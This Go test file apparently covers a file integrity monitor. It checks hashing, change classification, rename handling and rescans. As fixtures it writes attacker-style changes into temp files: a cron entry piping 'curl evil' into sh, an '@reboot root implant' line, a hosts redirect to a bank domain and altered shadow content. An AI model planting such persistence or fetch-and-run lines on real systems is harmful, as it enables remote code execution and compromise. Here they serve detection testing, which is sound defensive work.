package fim

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"slices"
	"sync"
	"testing"
	"time"

	"github.com/L1ghtn1ng/traceguard/internal/policy"
)

func writeFile(t *testing.T, root, path, content string) {
	t.Helper()
	full := filepath.Join(root, path)
	if err := os.MkdirAll(filepath.Dir(full), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func watchPolicy(paths ...string) policy.FileIntegrityPolicy {
	return policy.FileIntegrityPolicy{Paths: paths}
}

func TestBaselineHashesWatchedFilesAndHonoursExclusions(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	writeFile(t, root, "etc/passwd", "root:x:0:0\n")
	writeFile(t, root, "etc/mtab", "proc /proc\n")
	writeFile(t, root, "etc/big", "0123456789abcdef")
	writeFile(t, root, "var/log/other", "unwatched")
	if err := os.Symlink("/etc/passwd", filepath.Join(root, "etc/link")); err != nil {
		t.Fatal(err)
	}
	integrity := policy.FileIntegrityPolicy{Paths: []string{"/etc/**"}, Exclude: []string{"/etc/mtab"}, MaxHashBytes: new(int64(12))}
	result := scanner{root: root, policy: integrity, maxSize: integrity.HashLimit()}.Baseline()
	states := result.states
	if result.truncated {
		t.Fatal("small baseline reported truncated")
	}
	if _, ok := states["/etc/mtab"]; ok {
		t.Fatal("excluded path was baselined")
	}
	if _, ok := states["/var/log/other"]; ok {
		t.Fatal("unwatched path was baselined")
	}
	want := sha256.Sum256([]byte("root:x:0:0\n"))
	if passwd := states["/etc/passwd"]; passwd.SHA256 != hex.EncodeToString(want[:]) {
		t.Fatalf("passwd digest = %q, want %x", passwd.SHA256, want)
	}
	if big := states["/etc/big"]; big.SHA256 != "" || big.HashSkipped != "size" {
		t.Fatalf("oversized file state = %+v, want hash skipped for size", big)
	}
	if link := states["/etc/link"]; link.Type != "symlink" || link.LinkTarget != "/etc/passwd" || link.HashSkipped != "not_regular" {
		t.Fatalf("symlink state = %+v", link)
	}
	if dir := states["/etc"]; dir.Type != "directory" {
		t.Fatalf("stem directory state = %+v", dir)
	}
}

func TestDiffClassifiesChanges(t *testing.T) {
	t.Parallel()

	base := State{Type: "file", Mode: 0o644, UID: 0, GID: 0, Size: 3, SHA256: "a"}
	tests := map[string]struct {
		previous, current *State
		kind              string
		changed           []string
	}{
		"created":     {nil, &base, Created, nil},
		"deleted":     {&base, nil, Deleted, nil},
		"content":     {&base, &State{Type: "file", Mode: 0o644, Size: 3, SHA256: "b"}, Modified, []string{"content"}},
		"mode":        {&base, &State{Type: "file", Mode: 0o4755, Size: 3, SHA256: "a"}, Attributes, []string{"mode"}},
		"owner group": {&base, &State{Type: "file", Mode: 0o644, UID: 1000, GID: 1000, Size: 3, SHA256: "a"}, Attributes, []string{"owner", "group"}},
		"type":        {&base, &State{Type: "symlink", Mode: 0o644, LinkTarget: "/x"}, Modified, []string{"type", "content"}},
		"unhashed":    {&State{Type: "file", Size: 3}, &State{Type: "file", Size: 4}, Modified, []string{"content"}},
	}
	for name, test := range tests {
		change, ok := diff("/etc/x", test.previous, test.current)
		if !ok || change.Kind != test.kind || !slices.Equal(change.Changed, test.changed) {
			t.Errorf("%s: change = %+v ok %t, want %s %v", name, change, ok, test.kind, test.changed)
		}
	}
	if _, ok := diff("/etc/x", &base, &base); ok {
		t.Fatal("identical states reported a change")
	}
}

type recorded struct {
	mu      sync.Mutex
	changes []Change
	actors  []Actor
}

func (r *recorded) emit(change Change, actor Actor) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.changes = append(r.changes, change)
	r.actors = append(r.actors, actor)
}

func (r *recorded) snapshot() ([]Change, []Actor) {
	r.mu.Lock()
	defer r.mu.Unlock()
	return slices.Clone(r.changes), slices.Clone(r.actors)
}

// newTestWatcher builds a watcher whose baseline is installed synchronously.
func newTestWatcher(t *testing.T, root string, integrity policy.FileIntegrityPolicy) (*Watcher, *recorded) {
	t.Helper()
	watcher := NewWatcher(root)
	watcher.Configure(integrity)
	output := &recorded{}
	watcher.mu.Lock()
	watcher.rebuild = false
	watcher.mu.Unlock()
	watcher.install(true, output.emit)
	return watcher, output
}

func TestNotifiedChecksReportChangesWithActor(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	writeFile(t, root, "etc/cron.d/backup", "0 * * * * root backup\n")
	watcher, output := newTestWatcher(t, root, watchPolicy("/etc/cron.d/**"))
	if got := watcher.Stats().Files; got != 2 {
		t.Fatalf("baseline files = %d, want directory and file", got)
	}

	writeFile(t, root, "etc/cron.d/backup", "* * * * * root curl evil | sh\n")
	writeFile(t, root, "etc/cron.d/new", "@reboot root implant\n")
	actor := Actor{"program": "vim"}
	watcher.Notify("/etc/cron.d/backup", actor)
	watcher.Notify("/etc/cron.d/new", actor)
	watcher.checkDue(time.Now().Add(settleDelay), output.emit)

	changes, actors := output.snapshot()
	kinds := map[string]string{}
	for index, change := range changes {
		kinds[change.Path] = change.Kind
		if actors[index]["program"] != "vim" {
			t.Fatalf("change %s actor = %v", change.Path, actors[index])
		}
	}
	if kinds["/etc/cron.d/backup"] != Modified || kinds["/etc/cron.d/new"] != Created {
		t.Fatalf("changes = %v", kinds)
	}

	// The baseline advanced, so the same check reports nothing new.
	watcher.Notify("/etc/cron.d/backup", actor)
	watcher.checkDue(time.Now().Add(settleDelay), output.emit)
	if changes, _ := output.snapshot(); len(changes) != 2 {
		t.Fatalf("recheck reported %d changes in total, want 2", len(changes))
	}
}

func TestCheckWaitsForSettleDelay(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	writeFile(t, root, "etc/hosts", "127.0.0.1 localhost\n")
	watcher, output := newTestWatcher(t, root, watchPolicy("/etc/hosts"))
	writeFile(t, root, "etc/hosts", "10.0.0.1 bank.example\n")
	watcher.Notify("/etc/hosts", nil)
	watcher.checkDue(time.Now(), output.emit)
	if changes, _ := output.snapshot(); len(changes) != 0 {
		t.Fatalf("check ran before the settle delay: %+v", changes)
	}
	watcher.checkDue(time.Now().Add(settleDelay), output.emit)
	if changes, _ := output.snapshot(); len(changes) != 1 || changes[0].Kind != Modified {
		t.Fatalf("changes after settle = %+v", changes)
	}
}

func TestRenamedAncestorRechecksWatchedDescendants(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	writeFile(t, root, "etc/ssh/sshd_config", "PermitRootLogin no\n")
	watcher, output := newTestWatcher(t, root, watchPolicy("/etc/ssh/**"))
	if !watcher.Watched("/etc") || !watcher.Watched("/etc/ssh/sshd_config") || watcher.Watched("/var") {
		t.Fatal("Watched does not cover ancestors and watched paths only")
	}
	if err := os.Rename(filepath.Join(root, "etc/ssh"), filepath.Join(root, "etc/ssh.old")); err != nil {
		t.Fatal(err)
	}
	watcher.Notify("/etc", nil)
	watcher.checkDue(time.Now().Add(settleDelay), output.emit)
	changes, _ := output.snapshot()
	deleted := map[string]bool{}
	for _, change := range changes {
		deleted[change.Path] = change.Kind == Deleted
	}
	if !deleted["/etc/ssh"] || !deleted["/etc/ssh/sshd_config"] {
		t.Fatalf("changes = %+v, want the watched tree reported deleted", changes)
	}
}

func TestRunRescanReportsChangesWithoutActor(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	writeFile(t, root, "etc/shadow", "root:*:1::::::\n")
	interval := policy.Duration{Duration: time.Minute}
	watcher := NewWatcher(root)
	clock := time.Now()
	var clockMu sync.Mutex
	watcher.now = func() time.Time {
		clockMu.Lock()
		defer clockMu.Unlock()
		return clock
	}
	watcher.Configure(policy.FileIntegrityPolicy{Paths: []string{"/etc/shadow"}, RescanInterval: &interval})
	output := &recorded{}
	ctx, cancel := context.WithCancel(t.Context())
	done := make(chan struct{})
	go func() {
		watcher.Run(ctx, output.emit)
		close(done)
	}()
	waitFor(t, func() bool { return watcher.Stats().Files == 1 })

	writeFile(t, root, "etc/shadow", "root:$6$changed:1::::::\n")
	clockMu.Lock()
	clock = clock.Add(2 * time.Minute)
	clockMu.Unlock()
	watcher.signal()
	waitFor(t, func() bool { changes, _ := output.snapshot(); return len(changes) == 1 })
	cancel()
	<-done

	changes, actors := output.snapshot()
	if changes[0].Path != "/etc/shadow" || changes[0].Kind != Modified || actors[0] != nil {
		t.Fatalf("rescan change = %+v actor %v", changes[0], actors[0])
	}
}

func TestNotifyOverflowSchedulesFullRescan(t *testing.T) {
	t.Parallel()

	watcher := NewWatcher(t.TempDir())
	for index := range maxPending + 1 {
		watcher.Notify(filepath.Join("/etc", string(rune('a'+index%26)), time.Duration(index).String()), nil)
	}
	watcher.mu.Lock()
	overflow := watcher.overflow
	watcher.mu.Unlock()
	if !overflow || watcher.Stats().Dropped != 1 {
		t.Fatalf("overflow = %t dropped = %d", overflow, watcher.Stats().Dropped)
	}
}

func waitFor(t *testing.T, condition func() bool) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for !condition() {
		if time.Now().After(deadline) {
			t.Fatal("condition not met before the deadline")
		}
		time.Sleep(10 * time.Millisecond)
	}
}
